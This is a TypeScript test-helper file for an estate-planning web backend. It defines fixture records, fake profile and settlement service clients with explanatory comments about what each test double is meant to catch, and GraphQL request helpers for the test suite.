  professionalKind: 'attorney',
  hasEmail: true,
  hasPhone: false,
  hasAddress: false,
  hasNotes: false,
  linked: false,
};

export const CONTACT_DETAIL: ContactDetail = {
  id: CONTACT_SUMMARY.id,
  ownerUserId: PROFILE.userId,
  name: 'Alice Attorney',
  email: 'alice@law.example',
  phone: null,
  address: null,
  relationship: 'friend',
  professionalKind: 'attorney',
  notes: null,
};

export const ROLE_ASSIGNMENT: RoleAssignment = {
  id: 'e0000000-0000-4000-8000-000000000001',
  contactId: CONTACT_SUMMARY.id,
  role: 'executor',
  scopeType: 'estate',
  scopeId: null,
  effectiveCondition: 'on_death_verified',
  startsAt: null,
  endsAt: null,
};

export const PERMISSION_GRANT: PermissionGrant = {
  id: 'g0000000-0000-4000-8000-000000000001',
  resource: 'contact',
  action: 'read',
  createdAt: '2026-08-06T00:00:00.000Z',
};

export class FakeProfileClient implements ProfileClient {
  profileCalls: string[] = [];
  saveProfileCalls: Array<{ accessToken: string; input: SaveProfileInput }> = [];
  familyCalls: string[] = [];
  createFamilyCalls: Array<{ accessToken: string; input: FamilyMemberInput }> = [];
  updateFamilyCalls: Array<{ accessToken: string; id: string; input: FamilyMemberInput }> = [];
  deleteFamilyCalls: Array<{ accessToken: string; id: string }> = [];
  contactsCalls: string[] = [];
  contactCalls: Array<{ accessToken: string; contactId: string }> = [];
  createContactCalls: Array<{ accessToken: string; input: ContactInput }> = [];
  updateContactCalls: Array<{ accessToken: string; contactId: string; input: ContactInput }> = [];
  deleteContactCalls: Array<{ accessToken: string; contactId: string }> = [];
  roleAssignmentsCalls: string[] = [];
  grantRoleCalls: Array<{ accessToken: string; input: RoleAssignmentInput }> = [];
  revokeRoleCalls: Array<{ accessToken: string; roleAssignmentId: string }> = [];
  permissionsCalls: Array<{ accessToken: string; roleAssignmentId: string }> = [];
  grantPermissionCalls: Array<{
    accessToken: string;
    roleAssignmentId: string;
    input: PermissionGrantInput;
  }> = [];
  revokePermissionCalls: Array<{
    accessToken: string;
    roleAssignmentId: string;
    grantId: string;
  }> = [];

  linkedEstatesResult: LinkedEstate[] = [
    {
      ownerUserId: 'a2c2e6a4-0000-4000-8000-00000000000e',
      contactId: 'a2c2e6a4-0000-4000-8000-00000000000f',
      ownerName: 'Ada Lovelace',
      roles: ['executor'],
    },
  ];
  profileResult: Profile | null = PROFILE;
  familyResult: FamilyMember[] = [FAMILY_MEMBER];
  contactsResult: ContactSummary[] = [CONTACT_SUMMARY];
  contactResult: ContactDetail = CONTACT_DETAIL;
  roleAssignmentsResult: RoleAssignment[] = [ROLE_ASSIGNMENT];
  permissionsResult: PermissionGrant[] = [PERMISSION_GRANT];
  profileError: Error | null = null;

  linkedEstatesCalls: string[] = [];

  linkedEstates(accessToken: string): Promise<LinkedEstate[]> {
    this.linkedEstatesCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.linkedEstatesResult);
  }

  /**
   * THE ESTATE'S CONTACTS (M23 PR4a), two of them, both professionals.
   *
   * `professionalKind` is set on both because these rows are what docs/03 §5.4
   * calls "verified contact cards for the estate's attorney/CPA" — a control
   * against grief-window phishing. A fixture of unlabelled relatives would
   * exercise the list and none of the reason it exists.
   */
  estateContactsResult: ContactSummary[] = [
    {
      id: 'a2c2e6a4-0000-4000-8000-000000000021',
      ownerUserId: 'a2c2e6a4-0000-4000-8000-00000000000e',
      name: 'Grace Hopper',
      relationship: null,
      professionalKind: 'attorney',
      hasEmail: true,
      hasPhone: true,
      hasAddress: false,
      hasNotes: false,
      linked: true,
    },
    {
      id: 'a2c2e6a4-0000-4000-8000-000000000022',
      ownerUserId: 'a2c2e6a4-0000-4000-8000-00000000000e',
      name: 'Charles Babbage',
      relationship: 'child',
      professionalKind: null,
      hasEmail: false,
      hasPhone: false,
      hasAddress: false,
      hasNotes: false,
      linked: false,
    },
  ];
  estateContactsCalls: Array<{ accessToken: string; ownerUserId: string }> = [];

  estateContacts(accessToken: string, ownerUserId: string): Promise<ContactSummary[]> {
    this.estateContactsCalls.push({ accessToken, ownerUserId });
    return this.reject() ?? Promise.resolve(this.estateContactsResult);
  }

  profile(accessToken: string): Promise<Profile | null> {
    this.profileCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.profileResult);
  }

  saveProfile(accessToken: string, input: SaveProfileInput): Promise<void> {
    this.saveProfileCalls.push({ accessToken, input });
    return this.reject() ?? Promise.resolve();
  }

  family(accessToken: string): Promise<FamilyMember[]> {
    this.familyCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.familyResult);
  }

  createFamilyMember(accessToken: string, input: FamilyMemberInput): Promise<string> {
    this.createFamilyCalls.push({ accessToken, input });
    return this.reject() ?? Promise.resolve(FAMILY_MEMBER.id);
  }

  updateFamilyMember(accessToken: string, id: string, input: FamilyMemberInput): Promise<void> {
    this.updateFamilyCalls.push({ accessToken, id, input });
    return this.reject() ?? Promise.resolve();
  }

  deleteFamilyMember(accessToken: string, id: string): Promise<void> {
    this.deleteFamilyCalls.push({ accessToken, id });
    return this.reject() ?? Promise.resolve();
  }

  contacts(accessToken: string): Promise<ContactSummary[]> {
    this.contactsCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.contactsResult);
  }

  contact(accessToken: string, contactId: string): Promise<ContactDetail> {
    this.contactCalls.push({ accessToken, contactId });
    return this.reject() ?? Promise.resolve(this.contactResult);
  }

  createContact(accessToken: string, input: ContactInput): Promise<string> {
    this.createContactCalls.push({ accessToken, input });
    return this.reject() ?? Promise.resolve(CONTACT_SUMMARY.id);
  }

  updateContact(accessToken: string, contactId: string, input: ContactInput): Promise<void> {
    this.updateContactCalls.push({ accessToken, contactId, input });
    return this.reject() ?? Promise.resolve();
  }

  deleteContact(accessToken: string, contactId: string): Promise<void> {
    this.deleteContactCalls.push({ accessToken, contactId });
    return this.reject() ?? Promise.resolve();
  }

  roleAssignments(accessToken: string): Promise<RoleAssignment[]> {
    this.roleAssignmentsCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.roleAssignmentsResult);
  }

  grantRole(accessToken: string, input: RoleAssignmentInput): Promise<string> {
    this.grantRoleCalls.push({ accessToken, input });
    return this.reject() ?? Promise.resolve(ROLE_ASSIGNMENT.id);
  }

  revokeRole(accessToken: string, roleAssignmentId: string): Promise<void> {
    this.revokeRoleCalls.push({ accessToken, roleAssignmentId });
    return this.reject() ?? Promise.resolve();
  }

  permissions(accessToken: string, roleAssignmentId: string): Promise<PermissionGrant[]> {
    this.permissionsCalls.push({ accessToken, roleAssignmentId });
    return this.reject() ?? Promise.resolve(this.permissionsResult);
  }

  grantPermission(
    accessToken: string,
    roleAssignmentId: string,
    input: PermissionGrantInput,
  ): Promise<string> {
    this.grantPermissionCalls.push({ accessToken, roleAssignmentId, input });
    return this.reject() ?? Promise.resolve(PERMISSION_GRANT.id);
  }

  revokePermission(accessToken: string, roleAssignmentId: string, grantId: string): Promise<void> {
    this.revokePermissionCalls.push({ accessToken, roleAssignmentId, grantId });
    return this.reject() ?? Promise.resolve();
  }

  inviteLinkCalls: Array<{ accessToken: string; contactId: string }> = [];
  revokeLinkInvitationCalls: Array<{ accessToken: string; contactId: string }> = [];
  unlinkCalls: Array<{ accessToken: string; contactId: string }> = [];
  redeemLinkCalls: Array<{ accessToken: string; code: string }> = [];

  inviteLinkResult: LinkInvitation = {
    code: 'ESL1-ABCD-EFGH-JKMN-PQRS-TVWX-YZ01-2345-6789-ABCD',
    expiresAt: '2026-08-13T00:00:00.000Z',
  };

  inviteLink(accessToken: string, contactId: string): Promise<LinkInvitation> {
    this.inviteLinkCalls.push({ accessToken, contactId });
    return this.reject() ?? Promise.resolve(this.inviteLinkResult);
  }

  revokeLinkInvitation(accessToken: string, contactId: string): Promise<void> {
    this.revokeLinkInvitationCalls.push({ accessToken, contactId });
    return this.reject() ?? Promise.resolve();
  }

  unlink(accessToken: string, contactId: string): Promise<void> {
    this.unlinkCalls.push({ accessToken, contactId });
    return this.reject() ?? Promise.resolve();
  }

  redeemLink(accessToken: string, code: string): Promise<void> {
    this.redeemLinkCalls.push({ accessToken, code });
    return this.reject() ?? Promise.resolve();
  }

  private reject<T>(): Promise<T> | null {
    return this.profileError === null ? null : Promise.reject(this.profileError);
  }
}

/**
 * One case as SETTLEMENT shapes it — decedent/reporter UUIDs and all. The
 * double answers the SERVICE's shape, not the BFF's projection, so a test that
 * asserts `aboutMe` or `evidenceCount` is exercising the real projection rather
 * than a fixture that already agrees with it.
 */
export const SETTLEMENT_CASE: SettlementCase = {
  caseId: '11111111-1111-4111-8111-111111111111',
  decedentUserId: 'user-1',
  reportedBy: 'user-2',
  status: 'reported',
  reportSource: 'trusted_contact',
  evidence: [{ type: 'provider_match' }],
  waitingPeriodEnds: null,
  resolution: null,
  resolvedAt: null,
  createdAt: '2026-08-20T00:00:00.000Z',
};

export class FakeSettlementClient implements SettlementClient {
  listCalls: string[] = [];
  reportableCalls: string[] = [];
  reportCalls: Array<{
    accessToken: string;
    decedentUserId: string;
    source: ReportSource;
    evidence: readonly DocumentEvidence[];
  }> = [];
  evidenceCalls: Array<{ accessToken: string; caseId: string; evidence: DocumentEvidence }> = [];
  voidCalls: Array<{ accessToken: string; caseId: string }> = [];
  getSettingsCalls: string[] = [];
  updateSettingsCalls: Array<{ accessToken: string; waitingPeriodDays: number }> = [];

  listResult: SettlementCase[] = [SETTLEMENT_CASE];
  voidResult: SettlementCase = {
    ...SETTLEMENT_CASE,
    status: 'rejected_fraud',
    resolution: 'owner_voided',
    resolvedAt: '2026-08-20T01:00:00.000Z',
  };
  /**
   * TWO ESTATES, and the second has no roles.
   *
   * A linked contact with no role assignment is reportable — settlement's
   * query LEFT JOINs `role_assignments` and keeps the row — and it is the arm
   * a picker is most likely to drop, because "executor of X" reads like the
   * point of the list and `[]` reads like nothing.
   */
  reportableResult: ReportableEstate[] = [
    { decedentUserId: 'user-1', contactId: 'contact-1', roles: ['executor', 'viewer'] },
    { decedentUserId: 'user-9', contactId: 'contact-9', roles: [] },
  ];
  reportResult: SettlementCase = { ...SETTLEMENT_CASE, evidence: [] };
  settingsResult: SettlementSettings = { waitingPeriodDays: 5 };
  settlementError: Error | null = null;

  listMyCases(accessToken: string): Promise<SettlementCase[]> {
    this.listCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.listResult);
  }

  voidCase(accessToken: string, caseId: string): Promise<SettlementCase> {
    this.voidCalls.push({ accessToken, caseId });
    return this.reject() ?? Promise.resolve(this.voidResult);
  }

  reportableEstates(accessToken: string): Promise<ReportableEstate[]> {
    this.reportableCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.reportableResult);
  }

  reportCase(
    accessToken: string,
    input: {
      decedentUserId: string;
      source: ReportSource;
      evidence: readonly DocumentEvidence[];
    },
  ): Promise<SettlementCase> {
    this.reportCalls.push({ accessToken, ...input });
    return this.reject() ?? Promise.resolve(this.reportResult);
  }

  addEvidence(
    accessToken: string,
    caseId: string,
    evidence: DocumentEvidence,
  ): Promise<SettlementCase> {
    this.evidenceCalls.push({ accessToken, caseId, evidence });
    return (
      this.reject() ??
      Promise.resolve({
        ...this.reportResult,
        // FAITHFUL ABOUT THE EFFECT, not just the status code: attaching
        // GROWS the evidence array, and `evidenceCount` is projected from its
        // length. A double that returned an unchanged case would let a
        // resolver that silently dropped the attach pass.
        evidence: [...this.reportResult.evidence, evidence],
      })
    );
  }

  /**
   * TWO ESTATES AGAIN, and the second is the one that matters: `contact-9`
   * appears on BOTH this list and `reportableResult`, so a resolver that
   * resolved a contact id against the wrong list would still find a row. The
   * `decedentUserId` values differ between the two entries here, so a
   * resolver that returned the first row rather than the MATCHING one is
   * visible.
   */
  executorCasesResult: ExecutorCase[] = [
    {
      caseId: 'case-1',
      contactId: 'contact-1',
      decedentUserId: 'user-1',
      status: 'verified',
      verifiedAt: '2026-08-19T00:00:00.000Z',
      createdAt: '2026-08-18T00:00:00.000Z',
    },
    {
      caseId: 'case-9',
      contactId: 'contact-9',
      decedentUserId: 'user-9',
      status: 'active',
      verifiedAt: '2026-08-19T00:00:00.000Z',
      createdAt: '2026-08-18T00:00:00.000Z',
    },
  ];
  executorCasesCalls: string[] = [];
  stagesCalls: Array<{ accessToken: string; caseId: string }> = [];
  requestStageCalls: Array<{ accessToken: string; caseId: string; stage: string }> = [];
  stagesResult: SettlementStage[] = [
    {
      stageId: 'stage-1',
      caseId: 'case-1',
      stage: 'inventory',
      status: 'approved',
      requestedAt: '2026-08-19T00:00:00.000Z',
      decidedAt: '2026-08-19T01:00:00.000Z',
    },
  ];

  executorCases(accessToken: string): Promise<ExecutorCase[]> {
    this.executorCasesCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.executorCasesResult);
  }

  listStages(accessToken: string, caseId: string): Promise<SettlementStage[]> {
    this.stagesCalls.push({ accessToken, caseId });
    // FAITHFUL ABOUT SCOPE: a stage belongs to one case, and a double that
    // returned every stage regardless would hide a resolver passing the wrong
    // case id — which is exactly the id this surface resolves from a handle.
    return this.reject() ?? Promise.resolve(this.stagesResult.filter((st) => st.caseId === caseId));
  }

  requestStage(accessToken: string, caseId: string, stage: string): Promise<SettlementStage> {
    this.requestStageCalls.push({ accessToken, caseId, stage });
    return (
      this.reject() ??
      Promise.resolve({
        stageId: `stage-${stage}`,
        caseId,
        stage,
        status: 'requested',
        requestedAt: '2026-08-20T00:00:00.000Z',
        decidedAt: null,
      })
    );
  }

  /**
   * TWO ITEMS, and each one carries an arm a checklist is likely to drop.
   *
   * The FIRST is somebody else's move — a step the attorney owns. It is still
   * the executor's list: the person answerable for the administration is the
   * person who has to know a filing is outstanding, whoever files it.
   *
   * The SECOND is ALREADY DONE, because "what is left" reads like the point of
   * a list and a completed row reads like noise. An estate checklist is a
   * record of administration, not a to-do app.
   */
  tasksResult: SettlementTask[] = [
    {
      taskId: 'task-1',
      title: 'File the petition for probate with the county court',
      category: 'legal',
      assignedRole: 'attorney',
      dueAt: '2026-09-02T00:00:00.000Z',
      completedAt: null,
    },
    {
      taskId: 'task-2',
      title: 'Obtain certified copies of the death certificate',
      category: 'administrative',
      assignedRole: 'executor',
      dueAt: null,
      completedAt: '2026-08-20T00:00:00.000Z',
    },
  ];
  tasksCalls: Array<{ accessToken: string; caseId: string }> = [];
  completeTaskCalls: Array<{ accessToken: string; taskId: string; completed: boolean }> = [];

  listTasks(accessToken: string, caseId: string): Promise<SettlementTask[]> {
    this.tasksCalls.push({ accessToken, caseId });
    return this.reject() ?? Promise.resolve(this.tasksResult);
  }

  completeTask(accessToken: string, taskId: string, completed: boolean): Promise<SettlementTask> {
    this.completeTaskCalls.push({ accessToken, taskId, completed });
    const found = this.tasksResult.find((t) => t.taskId === taskId) ?? this.tasksResult[0];
    return (
      this.reject() ??
      Promise.resolve({
        ...(found as SettlementTask),
        // FAITHFUL ABOUT THE EFFECT, both ways: unticking CLEARS the
        // timestamp. A double that always returned a completed task would let
        // a resolver that dropped `completed: false` pass.
        completedAt: completed ? '2026-08-21T00:00:00.000Z' : null,
      })
    );
  }

  /**
   * THREE DISTRIBUTIONS, each carrying an arm this surface is likely to drop.
   *
   * The FIRST is 'planned' with an amount: not yet approved, so the executor
   * can do nothing to it but look — the state the dual-control gate produces
   * and the one a screen is tempted to offer buttons on.
   *
   * The SECOND is 'approved' with NO amount, because `amount_ct` is nullable
   * by design (a distribution may name an ASSET rather than a sum) and "no
   * amount recorded" reads like an error to anyone who assumed one was there.
   *
   * The THIRD belongs to ANOTHER CASE, so a resolver passing the wrong case id
   * is visible rather than silently plausible.
   */
  distributionsResult: SettlementDistribution[] = [
    {
      distributionId: 'dist-1',
      caseId: 'case-1',
      assetId: null,
      beneficiaryContactId: 'contact-1',
      status: 'planned',
      approvedAt: null,
      hasAmount: true,
      createdAt: '2026-08-20T00:00:00.000Z',
    },
    {
      distributionId: 'dist-2',
      caseId: 'case-1',
      assetId: 'asset-1',
      beneficiaryContactId: 'contact-9',
      status: 'approved',
      approvedAt: '2026-08-20T02:00:00.000Z',
      hasAmount: false,
      createdAt: '2026-08-20T01:00:00.000Z',
    },
    {
      distributionId: 'dist-9',
      caseId: 'case-9',
      assetId: null,
      beneficiaryContactId: 'contact-9',
      status: 'completed',
      approvedAt: '2026-08-20T02:00:00.000Z',
      hasAmount: true,
      createdAt: '2026-08-20T01:00:00.000Z',
    },
  ];
  distributionsCalls: Array<{ accessToken: string; caseId: string }> = [];
  recordDistributionCalls: Array<{
    accessToken: string;
    caseId: string;
    input: { beneficiaryContactId: string; assetId?: string; amount?: string };
  }> = [];
  distributionStatusCalls: Array<{
    accessToken: string;
    distributionId: string;
    status: string;
  }> = [];
  amountCalls: Array<{ accessToken: string; distributionId: string }> = [];
  /**
   * KEYED BY ROW, and the second entry is a NULL that is an ANSWER rather than
   * a failure — a double that answered every id with the same string could not
   * tell a resolver that ignored its argument from one that used it.
   */
  amountResult = new Map<string, string | null>([
    ['dist-1', '999999999999999.99'],
    ['dist-2', null],
  ]);

  listDistributions(accessToken: string, caseId: string): Promise<SettlementDistribution[]> {
    this.distributionsCalls.push({ accessToken, caseId });
    // FAITHFUL ABOUT SCOPE, like `listStages`: a distribution belongs to one
    // case, and a double returning every row regardless would hide a resolver
    // passing a case id it resolved wrongly.
    return (
      this.reject() ?? Promise.resolve(this.distributionsResult.filter((d) => d.caseId === caseId))
    );
  }

  recordDistribution(
    accessToken: string,
    caseId: string,
    input: { beneficiaryContactId: string; assetId?: string; amount?: string },
  ): Promise<SettlementDistribution> {
    this.recordDistributionCalls.push({ accessToken, caseId, input });
    return (
      this.reject() ??
      Promise.resolve({
        distributionId: 'dist-new',
        caseId,
        assetId: input.assetId ?? null,
        beneficiaryContactId: input.beneficiaryContactId,
        // FAITHFUL ABOUT THE STATE IT PRODUCES: a newly recorded distribution
        // is 'planned' and unapproved. A double that answered 'approved' would
        // let a screen offering the next step past the dual-control gate pass.
        status: 'planned',
        approvedAt: null,
        // ...and about the amount, which is a FLAG here and never a value.
        hasAmount: input.amount !== undefined,
        createdAt: '2026-08-21T00:00:00.000Z',
      })
    );
  }

  setDistributionStatus(
    accessToken: string,
    distributionId: string,
    status: string,
  ): Promise<SettlementDistribution> {
    this.distributionStatusCalls.push({ accessToken, distributionId, status });
    const found =
      this.distributionsResult.find((d) => d.distributionId === distributionId) ??
      this.distributionsResult[0];
    return this.reject() ?? Promise.resolve({ ...(found as SettlementDistribution), status });
  }

  distributionAmount(
    accessToken: string,
    distributionId: string,
  ): Promise<{ amount: string | null }> {
    this.amountCalls.push({ accessToken, distributionId });
    // FAITHFUL ABOUT WHAT IT REFUSES: an id this double knows nothing about
    // gets the service's uniform 404, not a cheerful null. "No amount
    // recorded" and "no such distribution" are different facts.
    if (!this.amountResult.has(distributionId)) {
      return this.reject() ?? Promise.reject(bffError('NOT_FOUND'));
    }
    return (
      this.reject() ?? Promise.resolve({ amount: this.amountResult.get(distributionId) ?? null })
    );
  }

  getSettings(accessToken: string): Promise<SettlementSettings> {
    this.getSettingsCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.settingsResult);
  }

  updateSettings(accessToken: string, waitingPeriodDays: number): Promise<SettlementSettings> {
    this.updateSettingsCalls.push({ accessToken, waitingPeriodDays });
    return this.reject() ?? Promise.resolve({ waitingPeriodDays });
  }

  private reject<T>(): Promise<T> | null {
    return this.settlementError === null ? null : Promise.reject(this.settlementError);
  }
}

export interface TestAppOptions {
  config?: BffConfig;
  identity?: IdentityClient;
  assets?: AssetsClient;
  assistant?: AssistantClient;
  documents?: DocumentsClient;
  profile?: ProfileClient;
  settlement?: SettlementClient;
  manifest?: PersistedOperationsManifest;
}

export async function makeApp(options: TestAppOptions = {}): Promise<INestApplication> {
  const app = await createBffApp({
    config: options.config ?? testConfig(),
    identity: options.identity ?? new FakeIdentityClient(),
    assets: options.assets ?? new FakeAssetsClient(),
    assistant: options.assistant ?? new FakeAssistantClient(),
    documents: options.documents ?? new FakeDocumentsClient(),
    profile: options.profile ?? new FakeProfileClient(),
    settlement: options.settlement ?? new FakeSettlementClient(),
    persistedOperations: options.manifest ?? new Map(),
    logger: false,
  });
  await app.init();
  return app;
}

export interface GqlRequestOptions {
  /** Omit the x-estate-csrf header entirely. */
  omitCsrf?: boolean;
  csrfValue?: string;
  cookie?: string;
}

export async function gql(
  app: INestApplication,
  body: Record<string, unknown>,
  options: GqlRequestOptions = {},
): Promise<SupertestResponse> {
  let req = request(app.getHttpServer() as Parameters<typeof request>[0])
    .post('/graphql')
    .set('accept', 'application/json')
    .set('content-type', 'application/json');
  if (!options.omitCsrf) {
    req = req.set('x-estate-csrf', options.csrfValue ?? '1');
  }
  if (options.cookie !== undefined) {
    req = req.set('cookie', options.cookie);
  }
  return req.send(JSON.stringify(body));
}

interface GqlError {
  message: string;
  extensions?: { code?: string };
}

export interface GqlBody {
  data?: Record<string, unknown> | null;
  errors?: GqlError[];
}

/** Typed view over supertest's `any` response body. */
export function gqlBody(res: SupertestResponse): GqlBody {
  return res.body as GqlBody;
}

export function sha256Hex(document: string): string {
  return createHash('sha256').update(document, 'utf8').digest('hex');
}

/**
 * A HAND-COPY of `apps/web/src/graphql/operations.ts`'s Session document, and
 * it is a copy because the BFF does not depend on the web app. That makes it a
 * drift hazard with a nasty shape: `persisted.spec.ts` hashes THIS string, so a
 * field added to the real document and forgotten here leaves the suite green
 * while it executes a document no client will ever send. M16 hit exactly that
 * when `audience` was added. Keep the two in step; the field list is the whole
 * of what can rot.
 */
export const SESSION_QUERY = 'query Session { session { userId mfaLevel stepUpFresh audience } }';
export const LOGIN_MUTATION =
  'mutation Login($email: String!, $password: String!) { login(email: $email, password: $password) { ok } }';
